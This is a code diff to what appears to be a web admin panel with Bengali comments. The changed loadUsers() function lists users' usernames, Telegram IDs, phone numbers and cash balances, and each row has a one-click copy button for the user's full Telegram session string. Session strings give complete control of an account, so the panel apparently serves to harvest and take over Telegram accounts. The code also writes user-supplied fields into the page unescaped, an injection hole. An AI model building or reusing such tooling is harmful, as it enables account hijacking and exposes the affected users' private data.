@@ -181,6 +181,56 @@
 table {
     min-width: 500px;
 }
+
+    /* টেবেলের শিরোনাম ও কলাম আলাদা করতে */
+.user-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+}
+.user-table th {
+    background: #1e293b;
+    color: #00f2fe;
+    padding: 10px 8px;
+    text-align: left;
+    font-weight: 700;
+    border-bottom: 2px solid var(--cyan);
+}
+.user-table td {
+    padding: 8px;
+    border-bottom: 1px solid #2d3a5e;
+}
+/* কলাম অনুযায়ী স্টাইল (ঐচ্ছিক) */
+.user-table td:nth-child(1) { font-weight: 600; color: #ffaa00; } /* User */
+.user-table td:nth-child(2) { font-family: monospace; } /* ID */
+.user-table td:nth-child(3) { color: #a0c4ff; } /* Phone */
+.user-table td:nth-child(4) { color: #00ff88; font-weight: bold; } /* Cash */
+.user-table td:nth-child(5) { font-size: 10px; font-family: monospace; background: rgba(0,242,254,0.05); } /* Session */
+.user-table td:nth-child(6) { text-align: center; } /* Copy বাটন */
+
+/* মোবাইল (ছোট স্ক্রিন) এর জন্য সেশন কলাম লুকানো ও প্যাডিং কমানো */
+@media (max-width: 768px) {
+    .user-table th, .user-table td {
+        padding: 5px;
+        font-size: 10px;
+    }
+    .user-table td:nth-child(5),
+    .user-table th:nth-child(5) {
+        display: none; /* মোবাইলে সেশন স্ট্রিং লুকান */
+    }
+    .premium-card {
+        padding: 15px;
+    }
+    /* অন্যান্য টেবিলের জন্য (যদি অন্য কোন টেবিল থাকে) */
+    table:not(.user-table) {
+        font-size: 11px;
+        min-width: 100%;
+    }
+    th, td {
+        padding: 6px 4px !important;
+        white-space: nowrap;
+    }
+}
 </style>
 
 </head>  <body>  <div id="admin-login-overlay">  
@@ -545,52 +595,39 @@ const setText = (id,v)=>{ if($(id)) $(id).innerText = v ?? ""; };
 /* ================= USERS ================= */
 async function loadUsers(){
   try {
-    console.log("Fetching /api/admin/users...");
     const r = await fetch(`${API}/api/admin/users`, { credentials:'include' });
-    console.log("Status:", r.status);
     const d = await r.json();
-    console.log("Data:", d);
-    
     const box = document.getElementById('member-list-body');
     if (!box) return;
+    if (r.status === 401) { box.innerHTML = `<div>Please login as admin first.</div>`; return; }
+    if (!d.users || d.users.length === 0) { box.innerHTML = `<div>No users found.</div>`; return; }
     
-    if (r.status === 401) {
-      box.innerHTML = `<div style="color:red;">Please login as admin first.</div>`;
-      return;
-    }
+    let html = `<table class="user-table">`;
+    html += `<thead><tr>`;
+    html += `<th>👤 User</th><th>🆔 Telegram ID</th><th>📞 Phone</th><th>💰 Cash</th><th>🔑 Session String</th><th>📋 Copy</th>`;
+    html += `</tr></thead><tbody>`;
     
-    if (!d.users || d.users.length === 0) {
-      box.innerHTML = `<div>No users found in database.</div>`;
-      return;
-    }
-    
-    let html = `<table style="width:100%;color:#fff; border-collapse:collapse;">
-      <thead>
-        <tr><th>User</th><th>ID</th><th>Cash</th><th>Session String</th><th>Copy</th></tr>
-      </thead>
-      <tbody>`;
-      
     d.users.forEach(u => {
       const session = u.session_string || "Not available";
-      // session string truncated for display, but full will be copied
-      const displaySession = session.length > 30 ? session.substring(0, 27) + "..." : session;
-      html += `<tr>
-        <td>${u.username || "N/A"}</td>
-        <td>${u.telegram_id || "N/A"}</td>
-        <td>৳${u.cash || 0}</td>
-        <td style="font-family:monospace; font-size:12px;">${displaySession}</td>
-        <td><button onclick="copyToClipboard('${session.replace(/'/g, "\\'")}')" style="background:var(--cyan); border:none; padding:4px 8px; border-radius:6px; cursor:pointer;">📋 কপি</button></td>
-      </tr>`;
+      const displaySession = session.length > 20 ? session.substring(0,17)+"..." : session;
+      let phone = u.phone || "N/A";
+      if (phone && phone.startsWith("+880")) phone = phone.slice(4); // শুধু 01... দেখাবে
+      html += `<tr>`;
+      html += `<td>${u.username || "N/A"}</td>`;
+      html += `<td>${u.telegram_id || "N/A"}</td>`;
+      html += `<td>${phone}</td>`;
+      html += `<td>৳ ${parseFloat(u.cash || 0).toFixed(2)}</td>`;
+      html += `<td style="font-family:monospace; font-size:11px;">${displaySession}</td>`;
+      html += `<td><button onclick="copyToClipboard('${session.replace(/'/g, "\\'")}')" style="background:var(--cyan); border:none; padding:4px 8px; border-radius:4px; cursor:pointer; font-size:11px;">📋 কপি</button></td>`;
+      html += `</tr>`;
     });
     html += `</tbody></table>`;
     box.innerHTML = html;
   } catch(e) {
-    console.error("loadUsers error:", e);
-    const box = document.getElementById('member-list-body');
-    if(box) box.innerHTML = `<div>Error: ${e.message}</div>`;
+    console.error(e);
+    document.getElementById('member-list-body').innerHTML = `<div>Error: ${e.message}</div>`;
   }
 }
-
 // কপি ফাংশন
 function copyToClipboard(text) {
   navigator.clipboard.writeText(text).then(() => {
